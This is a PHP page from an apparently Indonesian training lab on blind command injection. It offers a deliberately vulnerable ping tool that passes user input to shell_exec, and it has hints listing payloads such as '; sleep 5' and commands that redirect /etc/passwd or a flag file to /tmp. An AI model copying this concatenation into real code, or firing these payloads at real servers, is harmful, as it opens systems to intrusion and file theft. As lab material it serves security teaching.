<?php
$active   = 'basic-2';
$host     = $_POST['host'] ?? '';
$output   = '';
$error    = '';
$executed = false;
$elapsed  = 0;

function safe($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $host !== '') {
    $executed = true;
    $t_start  = microtime(true);

    // VULNERABLE: blind — output disembunyikan dari user, tapi injection tetap terjadi
    $cmd = "ping -c 1 " . $host . " > /dev/null 2>&1";
    shell_exec($cmd);

    $elapsed = round(microtime(true) - $t_start, 2);

    // Simulasi: tampilkan hanya status sukses/gagal, bukan output raw
    $output = ($elapsed > 0) ? "Request completed." : "Request failed.";
}

// Cek apakah ada file output yang ditulis oleh payload (simulasi out-of-band)
$dump_file = '/tmp/cmdi_output.txt';
$dump_content = '';
if (file_exists($dump_file)) {
    $dump_content = file_get_contents($dump_file);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Basic 2: Blind CMDi — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Basic 2: Blind CMDi</span></div>
    <h1>Blind Command Injection <span class="tag o">BASIC 2</span></h1>
    <p class="phdr-desc">Command dieksekusi di server namun outputnya tidak pernah ditampilkan ke browser. Gunakan teknik time-based dan output redirection untuk membuktikan eksekusi dan mengekstrak data.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Buktikan adanya blind injection menggunakan time-based detection dengan <code class="ic">sleep</code></span></li>
      <li><div class="obj-n">2</div><span>Redirect output command ke file <code class="ic">/tmp/cmdi_output.txt</code> lalu baca melalui viewer di bawah</span></li>
      <li><div class="obj-n">3</div><span>Tulis isi <code class="ic">/var/private/flag.txt</code> ke file output untuk membacanya</span></li>
      <li><div class="obj-n">4</div><span>Pahami perbedaan antara regular dan blind injection dari sisi detection dan exploitation</span></div></li>
    </ul>
  </div>

  <div class="box">
    <div class="box-t">Vulnerability Context</div>
    <div class="qbox"><div class="ql">Vulnerable PHP Code — Output disembunyikan</div><span class="val">$cmd</span> = <span class="str">"ping -c 1 "</span> . <span class="val">$host</span> . <span class="str">" > /dev/null 2>&1"</span>;
<span class="at">shell_exec</span>(<span class="val">$cmd</span>);              <span class="cm">// output dibuang ke /dev/null</span>
<span class="cm">// Tidak ada $output yang ditampilkan ke browser</span>
<span class="kw">echo</span> <span class="str">"Request completed."</span>;       <span class="cm">// hanya status generik</span></div>
    <p class="prose">Meski output tidak terlihat, command tetap dieksekusi di server. Teknik <strong>time-based</strong> memanfaatkan delay eksekusi, sementara <strong>output redirection</strong> menuliskan hasil ke file yang kemudian dapat dibaca melalui jalur lain.</p>
  </div>

  <div class="box">
    <div class="box-t">Connectivity Check Tool</div>
    <form method="POST" action="/basic-2/">
      <div class="fg">
        <label class="fl">Host <span style="color:var(--red);font-size:.65rem">(output TIDAK ditampilkan)</span></label>
        <input class="fi" type="text" name="host"
          value="<?= safe($host) ?>"
          placeholder="Contoh: 8.8.8.8 atau 8.8.8.8; sleep 5">
      </div>
      <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
        <button type="submit" class="btn btn-r">Check</button>
        <?php if($executed): ?><a href="/basic-2/" class="btn btn-g">Reset</a><?php endif; ?>
        <?php if($executed): ?>
        <span style="font-size:.8rem;font-family:var(--mono);color:var(--t3)">
          Response time: <span style="color:<?= $elapsed > 3 ? 'var(--orange)' : 'var(--green)' ?>"><?= $elapsed ?>s</span>
          <?= $elapsed > 3 ? ' &mdash; <span style="color:var(--orange)">delay terdeteksi!</span>' : '' ?>
        </span>
        <?php endif; ?>
      </div>
    </form>

    <?php if ($executed): ?>
    <div class="alert a-info" style="margin-top:14px;margin-bottom:0">
      Server response: <strong><?= safe($output) ?></strong>
      &mdash; Output command tidak ditampilkan.
    </div>
    <?php endif; ?>
  </div>

  <!-- Output file viewer -->
  <div class="box">
    <div class="box-t">Output File Viewer &mdash; /tmp/cmdi_output.txt</div>
    <p class="prose" style="margin-bottom:12px">Redirect output command ke <code class="ic">/tmp/cmdi_output.txt</code>, kemudian refresh halaman untuk membacanya di sini.</p>
    <?php if ($dump_content !== ''): ?>
    <div class="term-hdr">
      <span class="term-dot" style="background:#e63946"></span>
      <span class="term-dot" style="background:#f59e0b"></span>
      <span class="term-dot" style="background:#22c55e"></span>
      <span class="term-title">/tmp/cmdi_output.txt</span>
    </div>
    <div class="terminal"><?= safe($dump_content) ?></div>
    <?php if (str_contains($dump_content, 'FLAG{')): ?>
    <div class="alert a-ok"><strong>FLAG ditemukan dalam file output.</strong></div>
    <?php endif; ?>
    <?php else: ?>
    <div style="background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:14px 18px;font-size:.82rem;color:var(--t3);font-family:var(--mono)">
      File belum ada. Gunakan payload output redirection untuk mengisi file ini.
    </div>
    <?php endif; ?>
  </div>

  <div class="box">
    <div class="box-t">Technique Reference</div>
    <div class="qbox"><div class="ql">Payload yang dapat dicoba</div><span class="cm">-- Time-based: buktikan injection dengan delay</span>
8.8.8.8<span class="kw">;</span> <span class="str">sleep 5</span>                <span class="cm">-- respons lambat 5 detik = injection confirmed</span>
8.8.8.8<span class="kw">;</span> <span class="str">sleep 10</span>               <span class="cm">-- uji delay 10 detik</span>

<span class="cm">-- Output redirection: tulis output ke file</span>
8.8.8.8<span class="kw">;</span> <span class="str">id > /tmp/cmdi_output.txt</span>
8.8.8.8<span class="kw">;</span> <span class="str">cat /var/private/flag.txt > /tmp/cmdi_output.txt</span>
8.8.8.8<span class="kw">;</span> <span class="str">cat /etc/passwd > /tmp/cmdi_output.txt</span>

<span class="cm">-- Append ke file (tidak menimpa isi sebelumnya)</span>
8.8.8.8<span class="kw">;</span> <span class="str">uname -a >> /tmp/cmdi_output.txt</span></div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Time-based detection</summary>
      <div class="hint-body">Masukkan <code class="ic">8.8.8.8; sleep 5</code>. Jika response time lebih dari 5 detik, injection berhasil meskipun tidak ada output yang terlihat. Perhatikan indikator waktu di sebelah tombol Check.</div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Output redirection</summary>
      <div class="hint-body">Gunakan <code class="ic">&gt;</code> untuk menulis output ke file:<br><code class="ic">8.8.8.8; id > /tmp/cmdi_output.txt</code><br>Setelah submit, refresh halaman. Output dari <code class="ic">id</code> akan tampil di Output File Viewer di atas.</div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Baca flag via file</summary>
      <div class="hint-body"><code class="ic">8.8.8.8; cat /var/private/flag.txt > /tmp/cmdi_output.txt</code><br>Submit, lalu refresh halaman untuk melihat isi flag di Output File Viewer.</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Mitigasi blind injection</summary>
      <div class="hint-body">Blind injection sulit dideteksi karena tidak ada output anomali. Pertahanan utama adalah tidak pernah menggabungkan input pengguna ke dalam system command. Gunakan <code class="ic">escapeshellarg()</code> atau <code class="ic">escapeshellcmd()</code> jika command benar-benar diperlukan.</div>
    </details>
  </div>

</div>
<?php include '../includes/footer.php'; ?>
</body>
</html>
